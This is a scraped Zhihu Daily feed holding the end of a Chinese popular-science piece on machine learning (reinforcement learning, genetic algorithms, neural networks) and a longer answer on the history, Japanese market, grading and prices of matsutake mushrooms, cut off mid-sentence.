​</p>\n<blockquote>你请我吃过饭，我帮你修过空调，你曾经带我出去旅游，我之前给你买过生日礼物，你帮我内推过简历，我帮你引荐了一个官员，你给我推荐过股票，我帮你挂了一个协和医院的专家号。</blockquote>\n<p>​</p>\n<p>那么如何衡量我们之间关系的好坏，要把种种交往关系的过程数据化，不是不可能，只是数据量太多，维度太高，导致根本无法计算。</p>\n<p>那么有没有一种方法，既可以减少分析的数据量，又能够尽量的保留主要的信息。 ​</p>\n<p>你肯定听过一句话，<strong>成年人的世界只有利益。</strong><strong>​</strong></p>\n<p>那么我们就可以把所有的交际过程转换成利益得失，请吃饭多少钱，修空调多少钱，生日礼物多贵等等等，都可以折合成金钱指标。 ​</p>\n<p>这样原本多维的数据分析也就变成一维数据了，分析起来自然明确而简单，虽然有失精确，但是起码能够对人际交往这种事情进行衡量了。</p>\n<blockquote>这里只是为了数据降维举例，不讨论人情世故。</blockquote>\n<p>​</p>\n<p><strong>做错了就要挨揍 - 强化学习（Reinforcement learning）</strong></p>\n<p>上边提到的种种算法，不论是监督学习，还是无监督学习，都需要原料 - 也就是数据。</p>\n<p>没有数据的时候，机器还能学习吗？</p>\n<p>答案是肯定的，这种方法被称之为强化学习。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9983572622b4faf2747be873eccf1c6a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>强化学习的原理也很简单。</p>\n<p>就是直接把模型丢到环境中，模型会随机的进行操作，环境会对操作做出反馈，反馈就是惩罚或者奖励，我们可以把反馈定义为加分或者减分。</p>\n<p>如果某种操作能够得到高分的话，那么这个模型就会强化这个操作，来获得更高的分数。这也就是强化学习名称的的来由。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cfada6357f559dfe683cb6292afe335c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我们假设有个孩子叫小明，从来没追过女孩子，也没看过什么爱情片，总之对于恋爱这方面就是一张白纸（无数据）;</p>\n<p>但是年纪到了，春心萌动，他对班上的小红动了心，他决定追小红，于是就开始了各种操作（动作），小红也会对他的操作进行各种回复(反馈)。</p>\n<p>小红说他饿了，小明于是采取了以下操作：</p>\n<ul>\n<li>买了两个大馒头给小红送了过去，小红骂他，你是沙雕吗~惩罚（减分）；</li>\n<li>请小红吃海底捞，然后小红给他发了一条信息，今天晚上谢谢你哦~奖励（加分）。</li>\n</ul>\n<p>小明在这个过程中，<strong>发现请吃贵的，高档的东西，容易获得奖励，</strong>于是他就强化了这个操作，下一次直接请小红吃西餐~强化策略的过程。</p>\n<p>当然实际的恋爱过程并不是这么简单。</p>\n<p><strong>不同激励值的设置有可能会导致完全不同的结果</strong>，上文的例子中，如果只有请小红吃海底捞或者西餐才能获得加分，其它操作都是减分，小明很快就发现，这样下去钱包根本扛不住，所以小明毅然决然的选择了搞基，这就不是我们想要的了。</p>\n<p>目前强化学习的应用主要在游戏方面，比如打星际争霸的 AlphaStar。</p>\n<p><strong>让羊踢足球 - 遗传算法（Genetic Algorithm）</strong></p>\n<p>顾名思义，就是模拟对生物进化的过程，借鉴了达尔文和孟德尔的遗传学说。</p>\n<p>小明是个牧民，养了一群羊，有一天他突然奇想，要让他的羊们学会踢足球。</p>\n<p>但是羊跟不知道什么是足球，并且要把足球踢到门里去，小明也懒得训练他们。</p>\n<p>于是小明想了一个办法：</p>\n<ol>\n<li>随机找一群羊放到羊圈里，并且给羊圈里安上球门，放上足球；</li>\n<li>肯定有一部分羊对足球感兴趣，会试着踢足球，于是小明把那部分对足球不感兴趣的羊拿去烤了；</li>\n<li>留下来的羊开始生儿育女，同样的做法，不仅把对足球不感兴趣的羊弄死，还有把踢不远的羊也弄死（或者不让他们交配）；</li>\n<li>这样很多代过去了，留下了的羊，就能把足球踢的越准越好了。</li>\n</ol>\n<p>实际中的遗传算法，跟真正的遗传过程一样，也有染色体，基因，选择，变异，种群的概念，十分有意思，感兴趣的可以深入了解一下。</p>\n<p><strong><br>深度学习</strong><strong><br>神经网络（neural network）</strong></p>\n<p>既然称之为人工智能，人们自然的想到一个问题：</p>\n<p>人类是如何思考和学习的呢？</p>\n<p>人们开始从生物学的角度研究大脑工作的原理。</p>\n<p>初中我们就学过了，神经系统最为基础的结构就是『神经元』，这里不妨复习一下：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1ee8d46d683eed4468e30d84cd7077fa_720w.jpg?source=8673f162\" alt=\"\"></figure><ul>\n<li>一个神经元就有多个树突，用来接受外外接的消息；</li>\n<li>轴突只有一条，用来整合从树突传来的消息；</li>\n<li>通过轴突末梢把信息传递给其他神经元。<br><br>类似的，我们把借用神经元这种结构翻译成计算机能够识别的模型，就是以下这样，也被称之为感知器。</li>\n</ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-d3d75710576b333d06d57aad038c3dc0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>由于接受的信息的复杂了，所以要给每个输入赋予一个权重，也就是衡量这个信息重要程度的值。</p>\n<p>举个例子，别人打了你一拳，同时一滴雨落在你脸上，还有一只蚊子咬了你一口（三个输入信息）。那么很显然，打了一拳这个信息明显是最重要的（赋予权重），因为这个操作对你造成的伤害最大。</p>\n<p><strong>而训练一个神经网络，所谓的调参过程，也就是在调整这些权重，以使得最终的结果趋于准确。</strong></p>\n<p>当很多的感知器分层次的连接起来的时候，就形成了一个神经网络。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-24f280cacdd292fa779c120ddd56ce8d_720w.jpg?source=8673f162\" alt=\"\"></figure><ul>\n<li>蓝色我们称之为输入层；</li>\n<li>虚线我们称之为中间层，也被称之为隐藏层；可以是单层，也可以是多层；</li>\n<li>橙色的我们称之为输出层。</li>\n<li>中间的连线就是我们赋予的权重；</li>\n</ul>\n<p>目前你手机上的图片搜索，识别，甚至你抖音开的美颜滤镜，无一不归功神经网络的发展。</p>\n<p>那么神经网络工作的原理是什么？</p>\n<ol>\n<li>首先我们把一大堆数据塞给输入层，然后计算机会根据神经网络进行输出；</li>\n<li>将输出值与实际值进行比对，算出一个差值，根据这个差值反馈回去，调节不同的权重；</li>\n<li>循环往复这个过程，直到到达预期的目标；</li>\n</ol>\n<p>还是来一个简单的例子吧，识别数字 1。</p>\n<p>可以看到一共有 20 个输入，每个输入代表不同的值，涂色的我们可以用 1 代表，没涂的可以用 0 代表。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e6ecb64ae799dbd1bbd81f7a8a9b0281_720w.jpg?source=8673f162\" alt=\"\"></figure><p>第一次训练的时候，机器根据反馈，很容易的给出了这 20 个不同输入的权重，3，8，13，18 权重为 100%，其它格子为 0%。</p>\n<p>但是输入了第二幅图，实际的结果也是 1。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-21eba20d458e55371cf48f24933e1275_720w.jpg?source=8673f162\" alt=\"\"></figure><p>所以机器就将相关权重进行了调节，比如将 2 的权重从 0 调整到 50%，这样也能得到正确的结果。</p>\n<p>如此可以根据大量的数据，整个模型在不断的自我优化过程中，在成千上万次的训练中，模型会变得越加的准确。但是这个过程需要大量的运算，这也也就是为什么之前机器学习的效果并不理想的原因，算力不太够，算法也不太聪明。</p>\n<p>后来又发展出了卷积神经网络（CNN），生成对抗神经网络(GAN)，尤其是在图像处理领域上，大放异彩。</p>\n<p><strong><br><br>机器是否能够真的理解？</strong></p>\n<p>这是一个长盛不衰的话题，机器是否能够真的理解，机器是否有意识，以及机器是否能够预测？</p>\n<p>其实这个答案无关紧要。</p>\n<p>答案的关键，就在于你怎么定义，理解，意识，和预测？</p>\n<p>回到我们开头说道的算命，有一句话说得好：</p>\n<blockquote>你若信命，一切偶然都是必然；<br>你若不信，一切必然都是偶然。</blockquote>\n<p>问题是，『偶然的必然』和『必然的偶然』有区别么？</p>\n<p>同样的，</p>\n<p>你认为的机器学习不过是数字的统计和矩阵的运算，</p>\n<p>那我也可以认为人类的情感和意识只不过是化学反应和神经电位的传播。</p>\n<p>你可以认为 Alpha Go 不理解围棋，但是他就是打败柯洁；</p>\n<p>你可以认为 GAN 不懂梵高，但是它能够轻松地把《Starry night》的风格迁移到任何一副照片上；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ca2d133454768e134c90c8fed38ab20f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>对于结果来说，理解真的重要么，或者还是说人类所谓的理解，只不过是一厢情愿？</p>\n<p><strong>人类的出路</strong></p>\n<p>不可否认的是，虽然目前的人工智能还处于人工智障的状态，但是他也在飞速的成长。</p>\n<p>在某些领域，人工智能已经超越了人类，人类智力最后的堡垒 - 围棋，也在 5 年前也被人工智能拿下了。</p>\n<p>还有一个不可忽视的问题就是，人类有可能会看不懂『人工智能』，神经网络的存在多个隐藏层的时候，人们就无法理解其中的规律了。<strong>层数越多，结果越准确，也就越难以解释。</strong></p>\n<p>看不懂的后果的灾难性的，因为你不知道他某一天会采取什么你意想不到的举措，你还不知道怎么调节他，因为压根不知道问题在哪。</p>\n<p>有朋友可能会说，怕啥，人类还有终极大招，<strong>拉闸。</strong></p>\n<p>这个从来都不是什么好的解法，不信你看，现在多少电站都是无人值守的了。</p>\n<p>那么对于人类来说，最好的结局是什么？</p>\n<p><strong>『成为人工智能』。</strong></p>\n<p>毕竟，只有魔法才能打败魔法。</p>\n<p>以上。</p>\n<p>​</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/429749137\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739041"},{"title":"有谁可以普及一下松茸的知识及价格吗？","date":"2021-08-09 23:07:56","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/6165e6741d3d7e35c3275cb7246b911d_l.jpg?source=8673f162\"><span>碗丸，</span><span>公众号：碗丸食事（个人），日料栈（日料）</span>\n<a href=\"https://www.zhihu.com/question/28373997/answer/877625708\" hidden>阅读原文</a>\n</div>\n<div>\n<p>大家都知道，中国松茸变得很贵，是因为日本人爱松茸。所以，还是从日本人和松茸说起吧……</p>\n<p><strong>松茸</strong>（Tricholoma matsutake），中文也称松口蘑，日语称“松茸”（マツタケ，matsutake），来自伞菌目口蘑科口蘑属。松茸一般生长在略贫瘠的干燥林地上，<strong>共生于赤松、铁杉等树木的根部</strong>，尤其以赤松最具代表性，因此得名松茸。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-129523648f36a6ebe8678214094cd33c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>秋季的感觉。via：<a href=\"http://link.zhihu.com/?target=http%3A//tanohata-news.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>tanohata-news.com</span><span></span></a></p>\n<p><strong><strong>1、从前，有个佛系的蘑菇叫松茸</strong></strong></p>\n<p><strong>中国人将松茸视为高级美味的历史不过 30 年</strong>。在那之前，大多数国人不知松茸为何物，在云南人眼中松茸只是很平凡的菌菇，甚至因为味道有点奇怪（有些欧美人将其描述为“袜臭味”……）而被人嫌弃。虽然在饮食文化史上很多时候是中国人影响日本人，但在吃松茸这件事上，是日本人影响了中国人。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-052a4f0f8d4ee4f26559fa22033a42ea_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸饭先来一碗~ via：<a href=\"http://link.zhihu.com/?target=http%3A//park.ajinomoto.co.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>park.ajinomoto.co.jp</span><span></span></a></p>\n<p>日本关于松茸的最早记载出自奈良时代的<strong>《万叶集》</strong>，其中一首短歌提到了奈良春日山南侧的松茸，并将松茸之味形容为“秋之香”：</p>\n<blockquote>\n<em>高松の この嶺も狭に 笠立てて 満ち盛りたる 秋の香のよさ</em><br><em>（高松岭狭茸伞立，林间满盛秋之香）</em>\n</blockquote>\n<p>到了平安时代，《散木奇歌集》中提到了烤松茸料理，以及以松茸作为馈赠佳品。而《类聚杂要抄》中提到白河法皇在宇治平等院时吃到的御膳中有两种汁物：“寒汁松茸，热汁志女知”，即<strong>松茸冷汤和占地茸</strong>（シメジ，Shimeji，是玉蕈离褶伞、蟹味菇等几种菌类的统称）<strong>热汤</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-19473941273f8c5fe4098f43647330a5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>几种占地茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//kinokonojikan.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>kinokonojikan.com</span><span></span></a></p>\n<p>日本古代对松茸和占地茸有很高的评价，有<strong>“香在松茸，味在占地茸”</strong>的说法，松茸的香气一直令日本人神魂颠倒。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9eade70e32312a16f8d162251da8833f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>香在松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//r.gnavi.co.jp/kbku600\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>r.gnavi.co.jp/kbku600</span><span></span></a></p>\n<p>在奈良时代和平安时代，贵族与僧侣还会在秋季饶有兴趣地去山中采撷松茸，称为<strong>“松茸狩”</strong>（松茸狩り）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9dca2d7fcc287e19b2dbefdb5b470a72_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《三条左大臣实房公松茸狩之图》中的松茸狩。via：《食彩之国》</p>\n<p>话说，<strong>松茸其实是个很佛系的菌菇</strong>。它其实不擅长和其他菌菇在土壤肥沃的地方争夺地盘，反而在其他菌菇难以忍受的贫瘠之地可以怡然自得地生息。于是，<strong>在室町时代</strong>，松茸赶上了属于自己的一波行情。由于当时京都需要大量的木材作为建筑材料和燃料，<strong>京都周边山林几经砍伐，反而促进了松茸的生长</strong>。于是，贵族们有更多吃到松茸的机会。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-570b19a6808c5fc199ab80635bf9c913_720w.jpg?source=8673f162\" alt=\"\"></figure><p>via：<a href=\"http://link.zhihu.com/?target=http%3A//mi-journey.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>mi-journey.jp</span><span></span></a></p>\n<p>室町时代的《庭训往来》中记载了<strong>松茸酒煎和平菇雁煎</strong>的做法；《新札往来》中则提到了干松茸和榛子、核桃、柏实、杏仁、干枣、海苔可以用来作配茶的<strong>茶菓子</strong>。从正餐到茶点，都可以用富贵的松茸来点缀呢~</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fb09e0d2c7f5f97cc536b68ed0d53cea_720w.jpg?source=8673f162\" alt=\"\"></figure><p>室町时代的贵族热爱松茸 。via：慕帰繪々詞</p>\n<p>镰仓时代的《徒然草》中说，只有松茸、鲤鱼、雉鸡这样有品位的食材才适合呈给天皇陛下……</p>\n<p>咦？等一下！到镰仓时代为止，松茸一直是贵族阶层专属的高级食材，这么不接地气的食材是怎么成为日本全民的“秋季味觉”呢？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-216b24957118c44f058baf619f67a9dc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>听说很多人爱吃自己，松茸表示惶恐。via：<a href=\"http://link.zhihu.com/?target=http%3A//fushimiinari-chirimen-an.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>fushimiinari-chirimen-an.com</span><span></span></a></p>\n<p>因为到了江户时代，情况发生了变化。不仅鲤鱼走下了神坛，随着产量的增加，<strong>松茸也变成庶民可以品尝的美味</strong>，“松茸狩”也成了庶民喜闻乐见的活动……历史就是一次又一次的啪啪打脸。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7bf66ff101a00b056f33b91c38878c28_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸寿司。via：<a href=\"http://link.zhihu.com/?target=http%3A//manoshokudo.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>manoshokudo.jp</span><span></span></a></p>\n<p>江户时代的《本朝食鉴》中记载了 10 种常见菌菇，其中就包括松茸。而记录平民饮食料理方法的《料理物语》中也有“松茸”的条目，提到将松茸酒煎，然后加水和出汁，最后配以柚子片的做法。在《合类日用料理抄》、《素人菜刀》、《料理山海乡》等平民料理书中，还记载了<strong>松茸吸物、烤物、蒸物、寿司</strong>等料理的方法。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-817aab3d5f90d3c9421cb332b4d40be7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸吸物。via：<a href=\"http://link.zhihu.com/?target=http%3A//kikkoman.co.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>kikkoman.co.jp</span><span></span></a></p>\n<p>现代的松茸料理主要有炭烤松茸、松茸土瓶蒸、松茸天妇罗、松茸饭、松茸清汤、松茸茶碗蒸等。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c2cddca031493e0efccea5b893a51bb7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸茶碗蒸。via：<a href=\"http://link.zhihu.com/?target=http%3A//kikkoman.co.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>kikkoman.co.jp</span><span></span></a></p>\n<p>将松茸掰开，在炭火上烤香，然后淋酢橘汁食用，一道<strong>炭烤松茸</strong>最能让人感受到松茸的原始风味。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-aa28e048dbcc620478af46754723dc43_720w.jpg?source=8673f162\" alt=\"\"></figure><p>烤松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//kikkoman.co.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>kikkoman.co.jp</span><span></span></a></p>\n<p>而将松茸与虾、<a href=\"https://zhuanlan.zhihu.com/p/73572220\">海鳗</a>、银杏等食材一起放在盛满出汁的陶器中蒸煮，便成了<strong>松茸土瓶蒸</strong>，松茸土瓶蒸食材丰富，香气复合，充满华丽感。斟一盅松茸汤，淋一点酢橘汁，秋季的氛围漫上心头。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-37b4671c1a79723803795b648a74303d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸土瓶蒸。via: <a href=\"http://link.zhihu.com/?target=http%3A//gontaro.co.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>gontaro.co.jp</span><span></span></a></p>\n<p><strong>松茸饭</strong>可以非常简约，只是以昆布出汁或昆布鲣节<a href=\"http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIzNzExMDcwNQ%3D%3D%26mid%3D2247484540%26idx%3D1%26sn%3D4b6795140af68883f75bbc73f122bb1d%26chksm%3De8ccd0a2dfbb59b4ef465a22170c6e5216a9467fe4ef3752812b80312e23bfa109ae1cf707ce%26scene%3D21%23wechat_redirect\" target=\"_blank\" rel=\"nofollow noreferrer\">出汁</a>加少许酱油、酒、盐，再加上松茸一起炊制便可。也可以加入炊饭常见配菜胡萝卜和油豆腐，秋季时令的银杏、栗子等食材，以及毛豆。为什么要加毛豆呢？我们下文会揭晓答案。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4ca962dea7881ae6464ce2f4fcef9c45_720w.jpg?source=8673f162\" alt=\"\"></figure><p>只有松茸的松茸饭。via：<a href=\"http://link.zhihu.com/?target=http%3A//journey-of-japan.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>journey-of-japan.com</span><span></span></a></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5c41ef42d41704fd28519f28b6ea182b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸栗子饭。via：<a href=\"http://link.zhihu.com/?target=http%3A//yukazen-kono.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>yukazen-kono.jp</span><span></span></a></p>\n<p>2、<strong>松茸减产后，日本人如何度过虚无的秋季</strong></p>\n<p>从江户时代到昭和初期，日本人度过了大快朵颐食松茸的几百年。<strong>1941 年</strong>（昭和 16 年），<strong>日本松茸产量达到 12222 吨的历史最高峰</strong>。二战后，松茸产量锐减，但在 1950-1955 年之间有短暂的恢复。</p>\n<p><strong>1955 年后</strong>，石油、天然气等成为日本主要燃料，木材和柴火用量减少，大量森林被荒废。这种杂树丛生、幽暗潮湿，落叶堆积、土壤肥沃的森林不是松茸喜欢的类型，加之赤松的病虫害和老龄化（树龄 70-80 年的老赤松不再适合松茸共生）等问题，<strong>日本松茸产量从此一蹶不振，而松茸至今为止都无法实现人工养殖</strong>，于是日本松茸价格从此飙升到天际线。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5e13779c5ff9c615dad62dfce4dea421_720w.jpg?source=8673f162\" alt=\"\"></figure><p>1926-2014 年日本松茸产量和进口量的变化。via：<a href=\"http://link.zhihu.com/?target=http%3A//pref.ibaraki.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>pref.ibaraki.jp</span><span></span></a></p>\n<p>可是，怎么办？怎么办？怎么办？食过三代，味觉偏好已经形成，<strong>没有吃到松茸，仿佛整个秋季都是虚无的，仿佛这一年都白活了</strong>……</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6a0a19c759ba171a3b7c35ab2e836476_720w.jpg?source=8673f162\" alt=\"\"></figure><p>土豪们还是会一如既往地吃松茸，只不过花费比以往更多的银两。普通人也许会选择降低吃松茸的频率，在松茸季内心挣扎上百次，偶尔放纵一两下。从 1950 年代后半期开始，进口松茸走进日本人的生活，松茸爱好者又多了一个价格亲民的选择。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e1c749f52ea8f4e22d78f8c3488a91c7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸涨价后，爱吃松茸的人内心是这样的……</p>\n<p>2016 年，日本松茸产量 69.4 吨，其中 42.5 吨来自<strong>长野县</strong>，20.7 吨来自<strong>岩手县</strong>。而 2017 年日本松茸产量进一步减少，全国产量只有 18.2 吨，其中 8.7 吨来自岩手县，5.1 吨来自长野县。此外，冈山县、和歌山县、山形县、宫城县、京都府、奈良县等地也出产松茸。日本有名的松茸产地包括<strong>长野县的上田、岩手县的岩泉、京都的丹波、广岛县的世罗</strong>等地。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-119e9875ce4ada081a2b3b3ce1af4967_720w.jpg?source=8673f162\" alt=\"\"></figure><p>日本松茸的主要产地。via：<a href=\"http://link.zhihu.com/?target=http%3A//dash-dash-dash.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>dash-dash-dash.jp</span><span></span></a></p>\n<p>另一方面，日本从其他松茸产国大量进口松茸。早期以从韩国和北朝鲜进口为主，近年来则主要从<strong>中国、土耳其、美国、加拿大等</strong>国进口，也从不丹、墨西哥、北朝鲜、韩国、北欧等国少量进口，其中以<strong>从中国进口松茸数量最多，占日本松茸进口总量的 70%左右</strong>。中国出产的松茸大部分来自云南为代表的西南地区，少量来自东北地区。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ff950e0042f4739f2fd5fe5e8fb250b2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>世界主要松茸产国。via：《筑地寻味》</p>\n<p>在 1995-2000 年左右，<strong>日本的松茸进口量</strong>曾高达 3500 吨 / 年，但<strong>近年数量回落到 800-1000 吨 / 年</strong>。尽管如此，日本松茸产量和进口量也存在巨大差异，很明显，这导致的结果就是：在日本吃到的绝大部分松茸都是进口松茸，而且很有可能是来自中国的松茸。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7d43339372635444b501df6f7e3cb4ab_720w.jpg?source=8673f162\" alt=\"\"></figure><p>2017 年向日本进口松茸的前五大进口国情况 。via：<a href=\"http://link.zhihu.com/?target=http%3A//earthresources.sakura.ne.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>earthresources.sakura.ne.jp</span><span></span></a></p>\n<p><strong>日本松茸的时令</strong>是自北向南，从寒冷地区向温暖地区推移的。在 8 月底从东北地区开始，到 11 月中旬九州地区结束，时令主要集中在 9-10 月。进口松茸的时令各有不同，中国松茸的时令是 7-10 月；北美产松茸的时令是 10-11 月，土耳其松茸的时令是 11 月。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f7928f9ecc5db6c15993b423284f5a77_720w.jpg?source=8673f162\" alt=\"\"></figure><p>日本松茸的时令。via：<a href=\"http://link.zhihu.com/?target=http%3A//dash-dash-dash.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>dash-dash-dash.jp</span><span></span></a></p>\n<figure><img src=\"https://pica.zhimg.com/v2-234f62218907c5d63e1662b6615d9696_720w.jpg?source=8673f162\" alt=\"\"></figure><p>进口松茸的时令。via：<a href=\"http://link.zhihu.com/?target=http%3A//shijou.city.osaka.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>shijou.city.osaka.jp</span><span></span></a></p>\n<p>和对很多食材的态度一样，<strong>日本人以本国松茸为贵</strong>，日本产松茸和进口松茸的价格往往存在很大差异。在日本的电商平台上，同样是中等大小、未开伞的松茸，日本产松茸可以卖到 10 0000 日元 / 公斤以上，而中国产松茸的价格是 1 6000 日元 / 公斤左右。在筑地 / 丰洲市场，日本产松茸是通过拍卖的形式交易的，而进口松茸是定价交易，日本产松茸可以拍卖到每公斤上百万日元。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-bac894c8e8d6c8d2c227469b0ac8e633_720w.jpg?source=8673f162\" alt=\"\"></figure><p>via：<a href=\"http://link.zhihu.com/?target=http%3A//agri.mynavi.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>agri.mynavi.jp</span><span></span></a></p>\n<p>看到此处，亲爱的土豪读者们可能会关心，什么样的松茸更贵呢？</p>\n<p>上文提到了<strong>“松茸大小”和“是否开伞”</strong>，这两个因素正是影响松茸价格的主要因素。松茸国际等级标准中，会以 S、M、L 等划分松茸的大小。以 HA 表示半开伞，以 HB 表示开伞，未标注 HA 和 HB 的为未开伞。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-765f66360404fc48ae4021f722e961ea_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-c06bdc6d7e7d813fa41c4d12dc58d8e6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸国际等级标准。via：<a href=\"http://link.zhihu.com/?target=http%3A//yunnanjun.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>yunnanjun.com</span><span></span></a></p>\n<p>日本国内的松茸，松茸大小也以 S、M、L 等划分，开伞情况则以分为<strong>“蕾”</strong>（コロ）、<strong>“未开伞”</strong>（つぼみ）、<strong>“半开伞”</strong>（中つぼみ）、<strong>“开伞”</strong>（開き）。其中“蕾”指的是幼嫩、未有完全发育的小型松茸，类似国际标准中的 S。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7c9df441825fc12a23eb76c357b4fcc2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>松茸开伞的情况：未开伞、半开伞、开伞。via：<a href=\"http://link.zhihu.com/?target=http%3A//item.fril.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>item.fril.jp</span><span></span></a></p>\n<p>松茸体型过小，尚未完全发育，香气就会不足。体型虽大，但已经开伞的松茸，香气开始外泄，菌柄变硬，也不完美。所以，<strong>体型较大、尚未开伞的松茸处在香气与质感的最佳平衡点上，价格也最高</strong>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-86628e9c4c73aaa91f1f4739d832fc56_720w.jpg?source=8673f162\" alt=\"\"></figure><p>未开伞的松茸。via：<a href=\"http://link.zhihu.com/?target=http%3A//news.biglobe.ne.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>news.biglobe.ne.jp</span><span></span></a></p>\n<p>开伞程度不同的松茸合适用来制作不同的料理。未开伞的松茸可以用来做烤松茸和土瓶蒸，食其脆嫩清幽；而已经开伞的松茸可以用来做松茸饭，取其香气澎湃。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7a885d5669d6a7ed11226487c0175937_720w.jpg?source=8673f162\" alt=\"\"></figure><p>开伞的松茸。via: <a href=\"http://link.zhihu.com/?target=http%3A//dancyu.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>dancyu.com</span><span></span></a></p>\n<p>3、<strong>日本松茸真的比外国松茸好吃吗？</strong></p>\n<p>然后，问题就来了。<strong>一些日本人认为日本产松茸比进口松茸好吃，这到底是玄学，还是日本松茸和进口松茸本身真的有所不同？</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-efbda7c660765453767c3075a203b854_720w.jpg?source=8673f162\" alt=\"\"></figure><p>via：<a href=\"http://link.zhihu.com/?target=http%3A//gangwondo.cocolog-nifty.com\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>gangwondo.cocolog-nifty.com</span><span></span></a></p>\n<p>从感官上来看，日本人认为<strong>中国松茸</strong>和<strong>日本松茸</strong>外观相似，但更柔软，香气和味道上还是日本松茸更佳。<strong>韩国松茸</strong>和日本松茸的相似度较高。<strong>北美松茸</strong>形状更短粗、颜色更白，生时香气较强，加热后则香气变薄。<strong>土耳其松茸</strong>体型较小，香气和味道比日本产松茸弱。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5f0725ad9a33c40e93bc20725bc01e96_720w.jpg?source=8673f162\" alt=\"\"></figure><p>左起：日本、墨西哥、北美松茸。via: <a href=\"http://link.zhihu.com/?target=http%3A//mi-journey.jp\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>mi-journey.jp</span><span></span></a></p>\n<p>从现在的物种分类上来看，<strong>北美松茸、土耳其松茸和日本松茸不是同一个物种</strong>。北美松茸的科学分类法名称是 Tricholoma magnivelare（分布在北美东部）和 Tricholoma 